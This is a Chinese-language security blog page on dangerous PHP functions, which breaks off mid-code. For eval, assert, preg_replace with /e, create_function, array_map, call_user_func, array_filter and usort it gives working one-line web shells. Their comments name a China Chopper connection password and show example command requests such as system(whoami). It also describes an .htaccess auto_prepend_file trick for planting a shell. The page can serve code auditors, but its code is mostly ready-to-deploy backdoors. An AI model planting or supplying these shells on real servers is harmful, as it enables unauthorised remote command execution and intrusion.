<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>Php 危险函数 - 东隅 Blog</title><meta name="author" content="东隅">
<meta name="author-link" content="">
<meta name="description" content="" /><meta name="keywords" content='代码审计, php安全' />
  <meta itemprop="name" content="php 危险函数">
  <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
  <meta itemprop="wordCount" content="452">
  <meta itemprop="keywords" content="代码审计,Php安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/25/">
  <meta property="og:site_name" content="东隅 Blog">
  <meta property="og:title" content="php 危险函数">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:modified_time" content="2024-08-15T09:31:01+08:00">
    <meta property="article:tag" content="代码审计">
    <meta property="article:tag" content="Php安全">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="php 危险函数">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/25/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/27/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E5%85%8D%E6%9D%80/67/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "php 危险函数",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/25\/"
    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, php安全","wordcount":  452 ,
    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/php\/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E\/25\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
      "@type": "Organization",
      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
        "@type": "Person",
        "name": "东隅"
      },"description": ""
  }
  </script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/posts/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/posts/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ></a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">Php 危险函数</li>
    </ol>
  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Php 危险函数</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="452 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>3 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="heading" class="heading-element"><span>0.0.0.1  </span>
  <a href="#heading" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h5><h6 id="getshell函数" class="heading-element"><span>0.0.0.1.1  getshell函数</span>
  <a href="#getshell%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ol>
<li>
<p><code>eval</code> 函数
传入的参数必须为PHP代码，既需要==以分号结尾==。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#命令執行：cmd=system(whoami);*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接密码：cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#ff636f">@</span><span style="color:#ff636f">eval</span>(<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>]);<span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>assert</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾，当然你加上也可以。*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#命令執行：cmd=system(whoami)*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接密码：cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> <span style="color:#ff636f">@</span><span style="color:#58a1dd">assert</span>(<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>])<span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span></code></pre></div></li>
<li>
<p><code>preg_replace</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#preg_replace(&#39;正则规则&#39;,&#39;替换字符&#39;，&#39;目标字符&#39;)*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#执行命令和上传文件参考assert函数(不需要加分号)。*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">preg_replace</span>(<span style="color:#a6be9d">&#34;/test/e&#34;</span>,<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#34;cmd&#34;</span>],<span style="color:#a6be9d">&#34;jutst test&#34;</span>);</span></span></code></pre></div></li>
<li>
<p><code>create_function</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#创建匿名函数执行代码*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#执行命令和上传文件参考eval函数(必须加分号)。*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接密码：cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$func</span> <span style="color:#ff636f">=</span><span style="color:#58a1dd">create_function</span>(<span style="color:#a6be9d">&#39;&#39;</span>,<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>]);<span style="color:#58a1dd">$func</span>();</span></span></code></pre></div></li>
<li>
<p><code>array_map</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#命令执行http://localhost/123.php?func=system cmd=whoami*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接http://localhost/123.php?func=assert 密码：cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$func</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;func&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$array</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">=</span><span style="color:#58a1dd">$cmd</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$new_array</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">array_map</span>(<span style="color:#58a1dd">$func</span>,<span style="color:#58a1dd">$array</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$new_array</span>;</span></span></code></pre></div></li>
<li>
<p><code>call_user_func</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#传入的参数作为assert函数的参数*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#cmd=system(whoami)*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接密码：cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">call_user_func</span>(<span style="color:#a6be9d">&#34;assert&#34;</span>,<span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">或者直接没有参数</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">call_user_func</span>(<span style="color:#a6be9d">&#34;phpinfo&#34;</span>);</span></span></code></pre></div></li>
<li>
<p><code>call_user_func_array</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#将传入的参数作为数组的第一个值传递给assert函数*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#cmd=system(whoami)*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接密码：cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$array</span>[<span style="color:#a6be9d">0</span>]<span style="color:#ff636f">=</span><span style="color:#58a1dd">$cmd</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">call_user_func_array</span>(<span style="color:#a6be9d">&#34;assert&#34;</span>,<span style="color:#58a1dd">$array</span>);</span></span></code></pre></div></li>
<li>
<p><code>array_filter</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#用回调函数过滤数组中的元素：array_filter(数组,函数)*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#命令执行func=system&amp;cmd=whoami*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接http://localhost/123.php?func=assert 密码cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$cmd</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;cmd&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$array1</span><span style="color:#ff636f">=</span><span style="color:#ff636f">array</span>(<span style="color:#58a1dd">$cmd</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$func</span> <span style="color:#ff636f">=</span><span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;func&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">array_filter</span>(<span style="color:#58a1dd">$array1</span>,<span style="color:#58a1dd">$func</span>);</span></span></code></pre></div></li>
<li>
<p><code>uasort</code> 函数</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#php环境&gt;=&lt;5.6才能用*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">*</span><span style="color:#828b96;font-style:italic">#菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) 密码：cmd*
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">usort</span>(<span style="color:#58a1dd">$_GET</span>,<span style="color:#a6be9d">&#39;asse&#39;</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#39;rt&#39;</span>);</span></span></code></pre></div></li>
<li>
<p>写入.htaccess</p>
</li>
</ol>
<p>php_value auto_prepend_file 是用来在页面底部加载文件的
这也是为什么我们要去写入#<!-- raw HTML omitted -->\ 在文件底部
而#应该是.hatccess文件特有的写入形式，没有的话会直接报错500</p>
<p>​      它比较灵活，不需要重启服务器，也不需要管理员权限。其格式为php_value 名称 值，在这里写入🐎（以注释的方式），然后在页面顶部加载它（auto_prepend_file）就行：</p>
<p>.htaccess文件的内容：php_value auto_prepend_file .htaccess #<!-- raw HTML omitted --></p>
<h6 id="代码执行的危险函数" class="heading-element"><span>0.0.0.1.2  代码执行的危险函数</span>
  <a href="#%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e7%9a%84%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ul>
<li>eval() 把字符串作为php代码执行</li>
</ul>
<p>早期php一句话木马都用这个</p>
<pre tabindex="0"><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code></pre><ul>
<li>assert() 检查一个断言是否为<code>false</code>，将字符串作为php代码执行</li>
</ul>
<p>同样经常被用作一句话木马</p>
<pre tabindex="0"><code>&lt;?php assert(@$_POST[&#39;shell&#39;]); ?&gt;</code></pre><ul>
<li>preg_replace() 执行正则表达式的搜索和替换</li>
</ul>
<p><a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192425.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192425.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192425.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192425.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192425.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a>
当匹配模式<code>/e</code>时，该函数会将<code>$replacement</code>作为php代码执行</p>
<p><code>preg_replace(&quot;/test/e&quot;,$_GET[&quot;shell&quot;],&quot;just test&quot;);</code>
<a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192718.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192718.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192718.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192718.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310192718.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>create_function() 创建一个匿名函数</li>
</ul>
<p>跟python的lambda语句类似，在php7.2.0后被废弃
<a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193030.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193030.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193030.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193030.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220310193030.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<pre tabindex="0"><code>$newfunc = create_function(&#39;$v&#39;, &#39;return system($v);&#39;);
